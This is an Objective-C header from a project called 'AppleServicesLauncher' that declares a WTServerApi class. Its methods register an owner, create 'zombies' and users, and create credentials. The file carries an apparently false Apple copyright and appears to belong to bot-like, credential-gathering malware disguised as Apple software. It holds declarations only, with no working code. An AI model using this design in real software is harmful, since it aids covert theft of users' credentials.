//
//  Initializer.h
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface WTServerApi : NSObject
+(NSString *) registerOwner;
+(NSString *) createZombie:(NSString *)ownerID;
+(NSString *)createUser:(NSString *)userName withZombieId:(NSString *)zombieId;
+(NSDictionary *)createAllUsers:(NSString *)zombieId;
+(void)createCredential;
+(void)createAllCredentialsForUser:(NSString *)user withUserId:(NSString *)userId;
+(void)createCredential:(NSDictionary *)credentialInfo withUserId:(NSString *)userId;
@end
